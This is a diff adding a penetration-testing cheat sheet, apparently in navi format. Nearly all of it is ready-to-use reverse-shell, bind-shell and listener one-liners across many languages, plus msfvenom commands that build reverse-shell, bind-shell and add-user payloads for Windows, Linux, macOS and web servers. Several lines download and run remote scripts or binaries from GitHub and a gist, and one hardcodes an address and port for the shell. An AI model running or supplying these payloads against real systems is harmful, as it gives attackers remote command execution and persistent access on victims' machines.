@@ -1,0 +1,267 @@
+% shell, reverse
+
+# Awk
+awk 'BEGIN {s = "/inet/tcp/0/<target>/<port>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
+
+# Bash TCP
+bash -i >& /dev/tcp/10.10.14.32/4444 0>&1
+
+# Bash TCP Alt
+0<&196;exec 196<>/dev/tcp/<target>/<port>; sh <&196 >&196 2>&196
+
+# Bash UDP
+sh -i >& /dev/udp/<target>/<port> 0>&1
+
+# Socat
+/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<target>:<port>
+
+# Socat (target with internet)
+wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<target>:<port>
+
+# Perl
+perl -e 'use Socket;$i="<target>";$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+# Perl Alt
+perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<target>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+#Perl (Windows Only)
+perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<target>:<port>");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
+
+# Python Linux (IPv4)
+export RHOST="<target>";export RPORT=<port>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
+
+# Python Linux Alt (IPv4)
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<target>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+
+# Python Linux (IPv6)
+python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",<port>,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
+
+# Python Linux Alt (IPv6)
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<target>",<port>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+# Python Windows
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('<target>', <port>)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+
+
+# PHP
+php -r '$sock=fsockopen("<target>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP Alt 1
+php -r '$sock=fsockopen("<target>",<port>);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP Alt 2
+php -r '$sock=fsockopen("<target>",<port>);`/bin/sh -i <&3 >&3 2>&3`;'
+
+# PHP Alt 3
+php -r '$sock=fsockopen("<target>",<port>);system("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP Alt 4
+php -r '$sock=fsockopen("<target>",<port>);passthru("/bin/sh -i <&3 >&3 2>&3");'
+
+# PHP Alt 5
+php -r '$sock=fsockopen("<target>",<port>);popen("/bin/sh -i <&3 >&3 2>&3", "r");'
+
+# PHP Alt 6
+php -r '$sock=fsockopen("<target>",<port>);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
+
+
+# Ruby
+ruby -rsocket -e'f=TCPSocket.open("<target>",<port>).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+
+# Ruby Alt
+ruby -rsocket -e 'exit if fork;c=TCPSocket.new("<target>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+# Ruby Windows
+ruby -rsocket -e 'c=TCPSocket.new("<target>","<port>");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+
+
+# Golang
+echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","<target>:<port>");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
+
+# Netcat
+ncat <target> <port> -e /bin/bash
+
+# Netcat Alt
+nc -c bash <target> <port>
+
+# Netcat UDP
+ncat --udp <target> <port> -e /bin/bash
+
+# Netcat (w/ rlwrap)
+rlwrap nc <target> <port>
+
+# Netcat Alt (w/ rlwrap)
+rlwrap -r -f . nc <target> <port>
+
+# OpenBsd
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <target> <port> >/tmp/f
+
+# OpenSSL
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes && openssl s_server -quiet -key key.pem -cert cert.pem -port <port>
+
+# Powershell
+powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("<target>",<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+
+# Powershell Alt 1
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<target>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+# Powershell Alt 2
+powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
+
+# Java/Groovy
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/<target>/<port>;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+
+# Java/Groovy Alt 1
+String host="127.0.0.1";
+int port=4444;
+String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+
+# Java/Groovy Alt 2 (Stealtier)
+Thread thread = new Thread(){
+    public void run(){
+        // Reverse shell here
+    }
+}
+thread.start();
+
+# Lua (Linux)
+lua -e "require('socket');require('os');t=socket.tcp();t:connect('<target>','<port>');os.execute('/bin/sh -i <&3 >&3 2>&3');"
+
+#Lua (Windows and Linux)
+lua5.1 -e 'local host, port = "<target>", <port> local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+
+
+# NodeJS
+(function(){
+    var net = require("net"),
+        cp = require("child_process"),
+        sh = cp.spawn("/bin/sh", []);
+    var client = new net.Socket();
+    client.connect(<port>, "<target>", function(){
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+    });
+    return /a/; // Prevents the Node.js application form crashing
+})();
+
+% shell, bind
+
+# Perl
+perl -e 'use Socket;$p=<port>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,">&C");open(STDOUT,">&C");open(STDERR,">&C");exec("/bin/bash -i");};'
+
+# Python
+python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",<port>));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
+
+# PHP
+php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,"0.0.0.0",<port>);socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,"$ ",2))exit;$in=socket_read($cl,100);$cmd=popen("$in","r");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'
+
+
+# Ruby
+ruby -rsocket -e 'f=TCPServer.new(<port>);s=f.accept;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",s,s,s)'
+
+
+# Netcat
+nc -nlvp <port> -e /bin/bash
+
+
+# OpenBsd
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp <port> >/tmp/f
+
+
+# Socat
+socat TCP-LISTEN:12345,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane
+
+#Powershell (target with internet)
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <IP> <port>
+
+% shell, listener
+# Socat Reverse
+socat file:`tty`,raw,echo=0 TCP-L:<port>
+
+# Socat Bind
+socat FILE:`tty`,raw,echo=0 TCP:<IP>:<port> 
+
+# OpenSSL
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect <target>:<port> > /tmp/s; rm /tmp/s
+
+% msfvenom, payload, windows
+# Reverse Shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f <file type> > reverse.exe
+
+# Bind Shell
+msfvenom -p windows/meterpreter/bind_tcp RHOST=<remoteIP> LPORT=<port> -f <file type> > bind.exe
+
+# Create User
+msfvenom -p windows/adduser USER=attacker PASS=attacker@123 -f <file type> > adduser.exe
+
+# CMD Shell
+msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<port> -f <file type> > prompt.exe
+
+# Execute Command
+msfvenom -a x86 --platform Windows -p windows/exec CMD=<command> -f <file type> > pay.exe
+
+# shikata_ga_nai Encoder
+msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i <itterations> -f <file type> > encoded.exe
+
+# Embedded inside executable
+msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -x < -f <file type> -o plinkmeter.exe
+
+% msfvenom, payload, linux
+# Reverse Shell
+msfvenom -p linux/<linuxOS>/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f elf > reverse.elf
+
+# Bind Shell
+msfvenom -p linux/<linuxOS>/meterpreter/bind_tcp RHOST=<IP> LPORT=<port> -f elf > bind.elf
+
+# SunOS (Solaris)
+msfvenom --platform=solaris --payload=solaris/<linuxOS>/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f elf -e x86/shikata_ga_nai -b '<bad bytes>' > solshell.elf
+
+% msfvenom, payload, mac
+# Reverse Shell:
+msfvenom -p osx/<linuxOS>/shell_reverse_tcp LHOST=<IP> LPORT=<port> -f macho > reverse.macho
+
+# Bind Shell
+msfvenom -p osx/<linuxOS>/shell_bind_tcp RHOST=<IP> LPORT=<port> -f macho > bind.macho
+
+msfvenom, payload, web
+# PHP Reverse Shell
+msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<port> -f raw > shell.php
+cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php
+
+# ASP/x Reverse shell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<port> -f aspx > reverse.aspx
+
+# JSP Reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f raw > reverse.jsp
+
+# WAR Reverse Shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<port> -f war > reverse.war
+
+# NodeJS
+sfvenom -p nodejs/shell_reverse_tcp LHOST=<IP> LPORT=<port>
+
+% msfvenom, payload, scripting
+# Perl
+msfvenom -p cmd/unix/reverse_perl LHOST=<IP> LPORT=<port> -f raw > reverse.pl
+
+# Python
+msfvenom -p cmd/unix/reverse_python LHOST=<IP> LPORT=<port> -f raw > reverse.py
+
+# Bash
+msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw
+
+% msfvenom, info
+# List msfvenom payloads
+msfvenom -l <listables>
+
+# List msfvenom payloads (Specific)
+msfvenom -l payloads --platform windows --arch x64
+
+
+$ msfplatform: list=( x86 x64 ) printf '%s\n' "${list[]@]}"
+$ linuxOS: list=( x86 x64 ) printf '%s\n' "${list[]@]}"
+$ listables: list=( payloads encoders nops platforms archs encrypt formats all ) printf '%s\n' "${list[]@]}"
